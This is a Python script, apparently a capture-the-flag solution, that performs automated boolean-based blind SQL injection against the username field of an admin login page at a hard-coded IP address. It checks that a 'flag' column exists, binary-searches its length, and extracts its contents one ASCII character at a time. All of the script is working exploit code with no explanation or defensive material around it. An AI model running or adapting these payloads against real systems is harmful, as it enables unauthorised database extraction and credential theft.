import urllib.request, urllib.parse

url = 'http://160.202.254.160:19353/admin/login'

def test(payload):
    data = urllib.parse.urlencode({'username': payload, 'password': '123456'}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return 'Redirecting' in resp.read().decode()
    except:
        return False

# Quick test - is the column really called 'flag'?
r = test("test' AND (SELECT flag FROM flag LIMIT 1) IS NOT NULL AND '1'='1")
print(f'flag column exists: {r}')

# Binary search for flag length
lo, hi = 1, 60
while lo < hi:
    mid = (lo + hi) // 2
    payload = "test' AND (SELECT LENGTH(flag) FROM flag LIMIT 1)>" + str(mid) + " AND '1'='1"
    if test(payload):
        lo = mid + 1
    else:
        hi = mid
flag_len = lo
print(f'Flag length: {flag_len}')

# Binary search for each character using ASCII value
flag = ""
for pos in range(1, flag_len + 1):
    lo_c, hi_c = 32, 126
    while lo_c < hi_c:
        mid_c = (lo_c + hi_c) // 2
        payload = "test' AND ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 1)," + str(pos) + ",1))>" + str(mid_c) + " AND '1'='1"
        if test(payload):
            lo_c = mid_c + 1
        else:
            hi_c = mid_c
    flag += chr(lo_c)
    print(f'[{pos}] chr({lo_c})={chr(lo_c)} => {flag}')

print(f'\nFinal flag: {flag}')
